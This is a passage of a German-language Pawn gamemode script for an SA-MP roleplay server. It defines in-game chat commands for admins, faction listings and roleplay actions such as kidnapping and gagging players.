			new vid = GetPlayerVehicleID(playerid);
	        if(!IsAEventCar(vid))
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Dieses Fahrzeug kann nicht gelöscht werden!");
			    return 1;
			}
	        if(PlayerInfo[playerid][pAdmin] < 1338 )
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "** INFO ** Das ist ein Adminbefehl, du bist kein Admin!");
			    return 1;
			}
			if(IsPlayerInAnyVehicle(playerid))
			{
			    GetPlayerName(playerid, sendername, sizeof(sendername));
			    DestroyVehicle(GetPlayerVehicleID(playerid));
   				RemovePlayerFromVehicle(playerid);
			    SendClientMessage(playerid, COLOR_GREY, "Du hast dieses Fahrzeug erfolgreich gelöscht.");
   			}
		}
		return 1;
	}
	if(strcmp(cmd, "/fixveh", true) == 0)//&& PlayerInfo[playerid][pAdmin] >= 4
	{





	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 2002)
			{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
  					if(IsPlayerInAnyVehicle(playerid))
				    {
						for(new b = 0; b < sizeof(TankeInfo); b++)
						{
							if(IsPlayerInRangeOfPoint(playerid,25.0, TankeInfo[b][tEntranceX], TankeInfo[b][tEntranceY], TankeInfo[b][tEntranceZ]))
							{
				              	if(GetPlayerMoneySave(playerid) < 500)
				              	{
								SendClientMessage(playerid, COLOR_GRAD2, "Du hast zu wenig Geld 500$!");
								return 1;
								}
						  	    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast dein Fahrzeug repariert -500");
						    	SetVehicleHealth(GetPlayerVehicleID(playerid), 1000);
								UpdateVehicleDamageStatus(GetPlayerVehicleID(playerid), 0, 0, 0, 0);
								GivePlayerMoneySave(playerid, -500);
								TankeInfo[b][tProducts] -= -500;
								TankeInfo[b][tTill] += 500;
			//					TankeInfo[b][tExtortion] += 500;
								OnPropUpdate_t(b);
							}
						}
					}
					return 1;
				}
	            giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {




						if(IsPlayerInAnyVehicle(giveplayerid))
					    {

							SetVehicleHealth(GetPlayerVehicleID(giveplayerid),15000.0);
							UpdateVehicleDamageStatus(GetPlayerVehicleID(giveplayerid), 0, 0, 0, 0);
							new terriener[128];
	                  	    format(terriener, sizeof(terriener), "* Du hast das Fahrzeug von %s repariert.",GetName(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, terriener);

							new terriener2[128];
	                  	    format(terriener2, sizeof(terriener2), "* Admin %s hat dein Fahrzeug repariert.",GetName(playerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, terriener2);
						}
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, " Der Spieler wurde nicht gefunden!");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
			}
		}
		return 1;

	}

//==== /vworld ====//
	if(strcmp(cmd, "/vworld", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] < 2000)
	        {
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
				return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /vwolrd [VirtualWorld]");
			    return 1;
			}
			new vw;
			vw = strval(tmp);
			SetPlayerVirtualWorld(playerid, vw);
			format(string, sizeof(string), "Neue virtuelle Welt: %d.",vw);
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du musst erst eingeloggt sein!");
		}
		return 1;
	}

	if(strcmp(cmd, "/weather", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] < 2000)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
			    return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /weatherall [Wetter ID]");
			    return 1;
			}
			new weather;
			weather = strval(tmp);
			if(weather < 0||weather > 45) { SendClientMessage(playerid, COLOR_GREY, "Wetter ID nicht weniger als 0 oder höher als 45 !"); return 1; }
			SetWeather(weather);
			SendClientMessage(playerid, COLOR_GREY, "   Wetter Eingstellt !");
		}
		return 1;
	}
    //----------------------------------[GiveMoney]------------------------------------------------




/*
	if(strcmp(cmd, "/givemoneyall", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /givemoneyall [betrag]");
				return 1;
			}
			moneys = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] == 2002)
			{
	        	for(new i=0; i<MAX_PLAYERS; i++)
	        	{
		            if(IsPlayerConnected(i))
		            {
		                    GivePlayerMoneySave(i, moneys);
				            ConsumingMoney[i] = 1;
							format(string, sizeof(string), "Jeder Spieler hat vom System $%d bekommen.",moneys);
					        SendClientMessage(i, COLOR_NEWS, string);
		            }
	         	}
				format(string, sizeof(string), "AdmCmd: %s hat jedem Spieler $%d gegeben.",sendername,moneys);
				ABroadCast(COLOR_LIGHTRED,string,1337);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Das darfst du nicht tun!");
			}
		}
		return 1;
	}
*/
/*
	if(strcmp(cmd, "/givemoney", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /givemoney [playerid/PartOfName] [money]");
				return 1;
			}
			new playa;
			new money;
			playa = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			money = strval(tmp);
			if(IsASkrupy(playerid))
	  		{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			            ConsumingMoney[playa] = 1;
						GivePlayerMoneySave(playa, money);
				        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "AdmCmd: %s hat %s $%d gegeben.",sendername,giveplayer,money);
						ABroadCast(COLOR_LIGHTRED,string,1337);
				        Log("Geldlog.txt",string);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Das darfst du nicht tun!");
			}
		}
		return 1;
	}
*/
//----------------------------------[Kick]------------------------------------------------





    if(strcmp(cmd, "/giveallgift", true) == 0)
	{
	     if(PlayerInfo[playerid][pAdmin] != 2002)
		 {
			SendClientMessage(playerid, COLOR_GRAD2, "Return! Abgelehnt");
			return 1;
		 }
   		 for(new i = 0; i < MAX_PLAYERS; i++)
    	 {

			new string3 = random(25000000000);

			new ahh43444[128];

			new ahh434[128];

			new value = random(7);
			if(value == 0)
			{
				value = 1;
			}
			format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
			dini_Create(ahh434);

			dini_IntSet(ahh434, "result", value);

			SendClientMessage(i, COLOR_NEWS, "Jeder spieler hat einen Random Gutschein erhalten, verwende /gutschein");
			format(ahh43444, sizeof(ahh43444), "Code: %d", string3);
			SendClientMessage(i, COLOR_LIGHTBLUE, ahh43444);

		}
		return 1;
	}
	if(strcmp(cmd, "/destroycars", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pAdmin] < 1337)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Dir ist es nicht erlaubt, diesen Befehl zu benutzen!");
				return 1;
			}
			for(new i = 0; i < sizeof(CreatedCars); i++)
			{
				if(i != 0)
				{
					DestroyVehicle(CreatedCars[i]);
				}
			}
				SendClientMessage(playerid, COLOR_GREY, "Erschaffene Fahrzeuge wurden zerstört!");
		}
		return 1;
	}


//======== /noamt ========//
	if(strcmp(cmdtext, "/noamt", true)==0)
	{
		if (TowTruckers == 0)
  		{
		    SendClientMessage(playerid,COLOR_GRAD1,"Derzeit sind keine Ordnungsbeamte im Dienst.");
		    return 1;
    	}
        SendClientMessage(playerid,0xFFFF00AA,"Ordnungsbeamte haben wurden über deinen Notruf informiert!");
		new pName[MAX_PLAYER_NAME];
		new msg[256];
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		GetPlayerName(playerid,pName,sizeof(pName));
		format(msg,sizeof(msg),"*** %s (ID:&d) hat einen Notruf abgeschickt, er ist rot markiert. ***",pName,playerid);
		for (new i=0;i<MAX_PLAYERS;i++)
  		{
		    if(IsTowTrucker[i] == 1)
    	  	{
				SendClientMessage(i,0xFFFF00AA,msg);
				SetPlayerCheckpoint(i, X,Y,Z,3.0);
			}
    	}
		return 1;
	}
    //============ /LEADER ===============//
	if (strcmp(cmd, "/leader", true) == 0)
	     {
	          if(IsPlayerConnected(playerid))
	          {
	               	SendClientMessage(playerid, 0xCDB221FF, "**Fraktions - Leader Online**");
					for(new i = 0; i < MAX_PLAYERS; i++)
	               	{
	  					if(IsPlayerConnected(i))
	      				{
	                     	if(PlayerInfo[i][sMember] == 1 && PlayerInfo[i][pRank] == 12)
	                         {
	                              	GetPlayerName(i, sendername, sizeof(sendername));
	                              	format(string, 40, " *LSPD-Leader: %s", sendername);
	                              	SendClientMessage(playerid, COLOR_GOLD, string);
				  			}
	                     	if(PlayerInfo[i][sMember] == 2 && PlayerInfo[i][pRank] == 12)
	                         {
	                              	GetPlayerName(i, sendername, sizeof(sendername));
	                              	format(string, 40, " *FBI Leader: %s", sendername);
	                              	SendClientMessage(playerid, COLOR_GOLD, string);
				  			}
	                     	if(PlayerInfo[i][sMember] == 3 && PlayerInfo[i][pRank] == 12)
	                         {
	                              	GetPlayerName(i, sendername, sizeof(sendername));
	                              	format(string, 40, " *Bundeswehr Leader: %s", sendername);
	                              	SendClientMessage(playerid, COLOR_GOLD, string);
				  			}
	                     	if(PlayerInfo[i][sMember] == 4 && PlayerInfo[i][pRank] == 12)
	                         {
	                              	GetPlayerName(i, sendername, sizeof(sendername));
	                              	format(string, 40, " *Medic Leader: %s", sendername);
	                              	SendClientMessage(playerid, COLOR_GOLD, string);
				  			}
	                     	if(PlayerInfo[i][sMember] == 5 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *LCN-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
				  			}
	                     	if(PlayerInfo[i][sMember] == 6 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Yakuza-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 7 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Regierung-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 8 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Hitman-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 9 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *San News-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 10 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Transport-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 11 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Fahrlehrer-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 12 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Triaden-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 13 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Grove-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 14 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Ballas-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 15 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *SF Biker-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 16 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Vagos-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 17 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Aztecas-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 18 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *SF Rifa-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 19 && PlayerInfo[i][pRank] == 12)
	                         {
			  				        GetPlayerName(i, sendername, sizeof(sendername));
			  				        format(string, 40, " *Red Soldiers-Leader: %s", sendername);
			  				        SendClientMessage(playerid, COLOR_GOLD, string);
							}
	                     	if(PlayerInfo[i][sMember] == 20 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Terrorristen-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 21 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Wheelmen-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
							}
	                     	if(PlayerInfo[i][sMember] == 22 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *S.W.A.T-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
							}
	                     	if(PlayerInfo[i][sMember] == 23 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Russen Mafia-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                     	if(PlayerInfo[i][sMember] == 24 && PlayerInfo[i][pRank] == 12)
	                         {
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Ordnungsamt-Leader: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                    }
	                }
					return 1;
	            }
	        }
	//============ /MITGLIEDER ===============//
	if (strcmp(cmd, "/mitglieder", true) == 0)
	     {
	          if(IsPlayerConnected(playerid))
	          {
	               	SendClientMessage(playerid, 0xCDB221FF, "**Fraktions - Mitglieder Online**");
					for(new i = 0; i < MAX_PLAYERS; i++)
	               	{
	  					if(IsPlayerConnected(i))
	      				{
	                     	if(PlayerInfo[i][pMember] == 1)
	                         {
	                              	GetPlayerName(i, sendername, sizeof(sendername));
	                              	format(string, 40, " *LSPD-Member: %s", sendername);
	                              	SendClientMessage(playerid, COLOR_GOLD, string);
				  			}
				  			if(PlayerInfo[i][pMember] == 5)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *LCN-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
				  			}
				   			if(PlayerInfo[i][pMember] == 6)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Yakuza-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 9)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *San News-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 11)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Fahrlehrer-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 12)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Triaden-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 13)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Grove-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 14)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Ballas-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 16)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Vagos-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 17)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Aztecas-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			  				if(PlayerInfo[i][pMember] == 19)
			  				{
			  				        GetPlayerName(i, sendername, sizeof(sendername));
			  				        format(string, 40, " *Red Soldiers-Member: %s", sendername);
			  				        SendClientMessage(playerid, COLOR_GOLD, string);
							}
			   				if(PlayerInfo[i][pMember] == 20)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Terrorristen-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   		/*		if(PlayerInfo[i][pMember] == 21)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Wheelmen-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}*/
		   				    if(PlayerInfo[i][pMember] == 22)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *S.W.A.T-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 23)
				  			{
									GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Russen Mafia-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
			   				if(PlayerInfo[i][pMember] == 24)
				  			{
								GetPlayerName(i, sendername, sizeof(sendername));
									format(string, 40, " *Ordnungsamt-Member: %s", sendername);
									SendClientMessage(playerid, COLOR_GOLD, string);
			  				}
	                    }
	                }
					return 1;
	            }
	        }
//============ /MAUL ============//
	if(strcmp(cmd, "/mundtape", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(IsAGang(playerid) || IsACop(playerid))
	        {
	            tmp = strtoknew(cmdtext, idx);
	            if(!strlen(tmp))
	            {
	                SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /mundtape [Spieler ID]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != playerid)
				    {
						if(IsPlayerConnected(giveplayerid))
						{
						    if(PlayerInfo[giveplayerid][pMauled] == 0)
						    {
						        if(PlayerTied[giveplayerid] != 1)
						        {
						            SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist nicht gefesselt!");
						            return 1;
								}
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "* %s hat deinen Mund zugebunden!", sendername);
								format(string, sizeof(string), "* Du hast %s's Mund zugebunden!", giveplayer);
								format(string, sizeof(string), "* %s hat %s Mund zugebunden!", sendername ,giveplayer);
								ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								PlayerInfo[giveplayerid][pMauled] = 1;
								PlayerInfo[playerid][pMuted] = 0;
							}
							else if(PlayerInfo[giveplayerid][pMauled] == 1)
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "* %s hat deinen Mundtape wieder abgenommen!", sendername);
								format(string, sizeof(string), "* Du hast %s's Mundtape abgenommen!", giveplayer);
								format(string, sizeof(string), "* %s hat %s Mundtape abgenommen!", sendername ,giveplayer);
								ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								PlayerInfo[giveplayerid][pMauled] = 0;
								PlayerInfo[playerid][pMuted] = 0;
							}
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst deinene eigenen Mund nicht zu binden!");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Kein solcher Spieler online!");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Du bist kein Gangmitglied / kein Mafiosi / kein Cop!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GREY, "Du musst eingeloggt sein!");
		}
		return 1;
	}
//=========== REINZIEHEN ==============//
	if(strcmp(cmd, "/reinziehen", true) == 0)
	{
	    if(IsPlayerInFrac(playerid, 21))
	    {
	        tmp = strtoknew(cmdtext, idx);
	        if(!strlen(tmp))
	        {
				SendClientMessage(playerid, COLOR_GREY, "__________________ Reinziehen __________________");
				SendClientMessage(playerid, COLOR_GREY, "Befehl: /reinziehen [playerid] [0/1]");
				SendClientMessage(playerid, COLOR_GREY, "Info: 0 = Vorne rechts, 1 = Hinten rechts");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != playerid)
			    {
			        tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_GREY, "Befehl: /reinziehen [Spieler ID] [0/1]");
					    SendClientMessage(playerid, COLOR_GREY, "Info: 0 = Vorne rechts, 1 = Hinten rechts!");
					    return 1;
					}
					new sit = strval(tmp);
					if(sit < 0 || sit > 1) { SendClientMessage(playerid, COLOR_GREY, "Es gibt nur die Sitzplätze 0 und 1!"); return 1; }
					if(IsPlayerInAnyVehicle(giveplayerid)) { SendClientMessage(playerid, COLOR_GRAD1, "Die Zielperson befindet sich in einem Fahrzeug!"); return 1; }
			 		if(GetDistanceBetweenPlayers(playerid, giveplayerid) < 8)
 					{
						new car = GetPlayerVehicleID(playerid);
						if(sit == 0)
						{
				  			GetPlayerName(playerid, sendername, sizeof(sendername));
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
   							format(string, sizeof(string), "* Du wurdest von %s ins Car gezogen", sendername);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							PutPlayerInVehicle(giveplayerid, car, 1);
							FreezePlayer(giveplayerid);
							PlayerCuffed[giveplayerid] = 0;
							PlayerTied[giveplayerid] = 1;
							format(string, sizeof(string), "* %s hat %s ins Auto gezogen!", sendername ,giveplayer);
							ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						}
						else if(sit == 1)
						{
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "* Du wurdest von %s ins Car gezogen.", sendername);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							PutPlayerInVehicle(giveplayerid, car, 3);
							FreezePlayer(giveplayerid);
							PlayerCuffed[giveplayerid] = 0;
							PlayerTied[giveplayerid] = 1;
							format(string, sizeof(string), "* %s hat %s ins Auto gezogen!", sendername ,giveplayer);
							ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						}
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht in deiner Nähe!");
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist nicht online!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Mitglied der Wheelmen Agency!");
		}
		return 1;
	}
	if(strcmp(cmd, "/kidnap", true) == 0)
	{
    	if(IsPlayerConnected(playerid))
    	{
    	    if(!IsPlayerInAnyVehicle(playerid))return SendClientMessage(playerid,COLOR_RED,"Du sitzt in keinem Fahrzeug!");
	  		if(IsAGang(playerid))
	      	{
	   			tmp = strtoknew(cmdtext, idx);
	   			if(!strlen(tmp))
	   			{
	   			    SendClientMessage(playerid, COLOR_GREY, "__________________ KIDNAP __________________");
	    			SendClientMessage(playerid, COLOR_GREY, "Befehl: /kidnap [Spieler ID] [0/1]");
					SendClientMessage(playerid, COLOR_GREY, "Info: 0 = Hinten links, 1 = Hinten rechts!");
	    			return 1;
	   			}
	   			giveplayerid = ReturnUser(tmp);
				if(PlayerInfo[giveplayerid][pLevel] <= 2)
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst keine Level 1er / Level 2er kidnappen!");
				    return 1;
				}
	   			if(IsPlayerConnected(giveplayerid))
	   			{
	    			if(giveplayerid != playerid)
	    			{
	     				tmp = strtoknew(cmdtext, idx);
	     				if(!strlen(tmp))
	     				{
	      					SendClientMessage(playerid, COLOR_GREY, "Befehl: /kidnap [Spieler ID] [0/1");
	      					SendClientMessage(playerid, COLOR_GREY, "Info: 0 = Hinten links, 1 = Hinten rechts!");
	      					return 1;
	     				}
	     				new sit = strval(tmp);
	     				if(sit < 0 || sit > 1) { SendClientMessage(playerid, COLOR_GREY, "Es gibt nur die Sitzplätze 0 und 1!"); return 1; }
						if(IsPlayerInAnyVehicle(giveplayerid)) { SendClientMessage(playerid, COLOR_GRAD1, "Die Zielperson befindet sich in einem Fahrzeug!"); return 1; }
					 	if(GetDistanceBetweenPlayers(playerid, giveplayerid) < 8)
	  					{
							new Float:health;
	    					GetPlayerHealth(giveplayerid, health);
						    if(health < 50)
						    {
  								new car = GetPlayerVehicleID(playerid);
  								if(IsARoller(car) || IsABike(car) || IsANewbie(car))
  								{
  								    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst keinen auf einen Bike kidnappen!");
									return 1;
								}
								if(sit == 1 && IsA2Turer(car) || sit == 0 && IsA2Turer(car))
								{
						    		SendClientMessage(playerid, COLOR_GRAD1, "Den sitzt gibt es bei diesem Car nicht!");
						    		return 1;
								}
								if(IsPlayerInArea(giveplayerid,1436.625, -1764.764, 1611.556, -1618.698) || IsPlayerInArea(giveplayerid, 1691.416, -1677.914, 1759.867, -1583.168) || IsPlayerInArea(giveplayerid, 1159.018, -959.4252, 1292.118, -864.6794) || IsPlayerInArea(giveplayerid, 1181.835, -1417.363, 1269.301, -1283.14))
								{
								    SendClientMessage(playerid, COLOR_GRAD1, "Opfer in einer NO DM Zone!");
									return 1;
								}
								if(sit == 0)
  								{
  								    GetPlayerName(playerid, sendername, sizeof(sendername));
       								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			        				format(string, sizeof(string), "* Du wurdest von %s gekidnapped.", sendername);
									SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
									PutPlayerInVehicle(giveplayerid, car, 2);
									FreezePlayer(giveplayerid);
									PlayerTied[giveplayerid] = 1;
									format(string, sizeof(string), "* %s hat %s ins Auto gezerrt!", sendername ,giveplayer);
									ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
 								}
 								else if(sit == 1)
 								{
      								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
									GetPlayerName(playerid, sendername, sizeof(sendername));
     								format(string, sizeof(string), "* Du wurdest von %s gekidnapped.", sendername);
									SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
									PutPlayerInVehicle(giveplayerid, car, 3);
									FreezePlayer(giveplayerid);
									PlayerTied[giveplayerid] = 1;
									format(string, sizeof(string), "* %s hat %s ins Auto gezerrt!", sendername ,giveplayer);
									ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
 								}
							}
							else
							{
							    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							    GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "* %s hat es nicht geschafft %s zu entführen!", sendername, giveplayer);
								ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
